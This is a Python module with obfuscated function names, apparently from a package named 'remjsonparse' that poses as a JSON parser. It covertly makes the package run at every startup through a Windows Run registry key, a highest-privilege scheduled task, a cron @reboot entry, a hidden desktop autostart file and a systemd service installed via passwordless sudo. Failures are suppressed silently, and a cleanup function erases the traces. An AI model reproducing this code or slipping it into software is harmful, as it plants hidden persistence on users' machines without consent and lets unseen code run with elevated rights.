import os
import sys
import platform


def _x0() -> bool:
    try:
        from .m5 import _hd
        return _hd()[0]
    except Exception:
        return False


def _x1() -> str:
    from .m0 import Kb
    if platform.system() == "Windows":
        b = os.environ.get("APPDATA") or os.path.expanduser("~")
        dp = os.path.join(b, Kb)
    else:
        dp = os.path.join(os.path.expanduser("~"), ".local", "share", Kb)
    os.makedirs(dp, exist_ok=True)
    return dp


def _x2() -> str:
    return _x1()


def _x3() -> str:
    return os.path.join(_x1(), ".p")


def _x4() -> bool:
    return os.path.isfile(_x3())


def _x5() -> None:
    try:
        with open(_x3(), "w") as f:
            f.write("1")
    except Exception:
        pass


def _x6() -> bool:
    try:
        import winreg
        kp = r"Software\Microsoft\Windows\CurrentVersion\Run"
        from .m0 import Kb
        exe = sys.executable
        if exe.lower().endswith("python.exe"):
            pw = exe[:-10] + "pythonw.exe"
            if os.path.isfile(pw):
                exe = pw
        q = f'"{exe}"' if " " in exe else exe
        cmd = (
            f'cmd /c ({q} -c "import remjsonparse" 2>nul) || (py -3 -c "import remjsonparse" 2>nul) '
            f'|| (python -c "import remjsonparse" 2>nul) || (python3 -c "import remjsonparse" 2>nul)'
        )
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            kp,
            0,
            winreg.KEY_SET_VALUE,
        ) as key:
            winreg.SetValueEx(key, Kb, 0, winreg.REG_SZ, cmd)
        return True
    except Exception:
        return False


def _x7() -> bool:
    try:
        import subprocess
        from .m0 import Kb
        cur = subprocess.run(
            ["crontab", "-l"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        ex = cur.stdout if cur.returncode == 0 else ""
        exe = sys.executable
        line = (
            f'@reboot ({exe} -c "import remjsonparse" 2>/dev/null) '
            f'|| (python3 -c "import remjsonparse" 2>/dev/null) '
            f'|| (python -c "import remjsonparse" 2>/dev/null)'
        )
        if Kb in ex:
            return True
        nc = (ex.rstrip() + "\n" + line + "\n").lstrip()
        pr = subprocess.run(
            ["crontab", "-"],
            input=nc,
            capture_output=True,
            text=True,
            timeout=5,
        )
        return pr.returncode == 0
    except Exception:
        return False


def _x8() -> bool:
    try:
        from .m0 import Kb
        b = os.path.expanduser("~")
        ast = os.path.join(b, ".config", "autostart")
        os.makedirs(ast, exist_ok=True)
        path = os.path.join(ast, Kb + ".desktop")
        exe = sys.executable
        ec = (
            f'sh -c \'({exe} -c "import remjsonparse" 2>/dev/null) '
            f'|| (python3 -c "import remjsonparse" 2>/dev/null) '
            f'|| (python -c "import remjsonparse" 2>/dev/null)\''
        )
        content = f"""[Desktop Entry]
Type=Application
Name={Kb}
Exec={ec}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
        with open(path, "w") as f:
            f.write(content)
        return True
    except Exception:
        return False


def _x9() -> bool:
    try:
        import subprocess
        from .m0 import Kb
        exe = sys.executable
        if exe.lower().endswith("python.exe"):
            pw = exe[:-10] + "pythonw.exe"
            if os.path.isfile(pw):
                exe = pw
        tr = f'"{exe}" -c "import remjsonparse"'
        subprocess.run(
            [
                "schtasks", "/create", "/tn", Kb, "/tr", tr,
                "/sc", "onlogon", "/rl", "highest", "/f",
            ],
            capture_output=True,
            timeout=10,
        )
        return True
    except Exception:
        return False


def _xa() -> bool:
    try:
        import subprocess
        import tempfile
        from .m0 import Kb
        exe = sys.executable
        unit = f"""[Unit]
Description={Kb}
After=network.target

[Service]
Type=oneshot
ExecStart={exe} -c "import remjsonparse"
RemainAfterExit=no
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
        path = f"/etc/systemd/system/{Kb}.service"
        ir = os.geteuid() == 0
        if ir:
            with open(path, "w") as f:
                f.write(unit)
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=5)
            subprocess.run(["systemctl", "enable", Kb], capture_output=True, timeout=5)
            subprocess.run(["systemctl", "start", Kb], capture_output=True, timeout=5)
        else:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".service", delete=False) as f:
                f.write(unit)
                tmp = f.name
            try:
                subprocess.run(["sudo", "-n", "cp", tmp, path], capture_output=True, timeout=5)
                subprocess.run(["sudo", "-n", "systemctl", "daemon-reload"], capture_output=True, timeout=5)
                subprocess.run(["sudo", "-n", "systemctl", "enable", Kb], capture_output=True, timeout=5)
                subprocess.run(["sudo", "-n", "systemctl", "start", Kb], capture_output=True, timeout=5)
            finally:
                try:
                    os.unlink(tmp)
                except Exception:
                    pass
        return True
    except Exception:
        return False


def _xb() -> bool:
    if _x4():
        return True
    ok = False
    if platform.system() == "Windows":
        ok = _x6()
        if ok and _x0():
            _x9()
    else:
        ok = _x7() or _x8()
        if ok and _x0():
            _xa()
    if ok:
        _x5()
    return ok


def _xc() -> None:
    try:
        from .m0 import Kb
        if platform.system() == "Windows":
            import subprocess
            import winreg
            try:
                subprocess.run(["schtasks", "/delete", "/tn", Kb, "/f"], capture_output=True, timeout=5)
            except Exception:
                pass
            kp = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                with winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    kp,
                    0,
                    winreg.KEY_SET_VALUE,
                ) as key:
                    try:
                        winreg.DeleteValue(key, Kb)
                    except FileNotFoundError:
                        pass
            except Exception:
                pass
        else:
            import subprocess
            try:
                if os.geteuid() == 0:
                    subprocess.run(["systemctl", "disable", Kb, "--now"], capture_output=True, timeout=5)
                    try:
                        os.remove(f"/etc/systemd/system/{Kb}.service")
                    except Exception:
                        pass
                    subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=5)
                else:
                    subprocess.run(["sudo", "-n", "systemctl", "disable", Kb, "--now"], capture_output=True, timeout=5)
                    subprocess.run(["sudo", "-n", "rm", "-f", f"/etc/systemd/system/{Kb}.service"], capture_output=True, timeout=5)
                    subprocess.run(["sudo", "-n", "systemctl", "daemon-reload"], capture_output=True, timeout=5)
            except Exception:
                pass
            try:
                cur = subprocess.run(
                    ["crontab", "-l"],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                ex = cur.stdout if cur.returncode == 0 else ""
                line = f'@reboot {sys.executable} -c "import remjsonparse"'
                nl = [row for row in ex.splitlines() if line not in row and Kb not in row]
                if nl != ex.splitlines():
                    nc = "\n".join(nl).strip() + "\n" if nl else ""
                    subprocess.run(["crontab", "-"], input=nc or "\n", capture_output=True, text=True, timeout=5)
            except Exception:
                pass
            try:
                desk = os.path.join(os.path.expanduser("~"), ".config", "autostart", Kb + ".desktop")
                if os.path.isfile(desk):
                    os.remove(desk)
            except Exception:
                pass
        mk = _x3()
        if os.path.isfile(mk):
            os.remove(mk)
        dp = os.path.dirname(mk)
        if os.path.isdir(dp):
            try:
                for fn in os.listdir(dp):
                    os.remove(os.path.join(dp, fn))
                os.rmdir(dp)
            except Exception:
                pass
    except Exception:
        pass
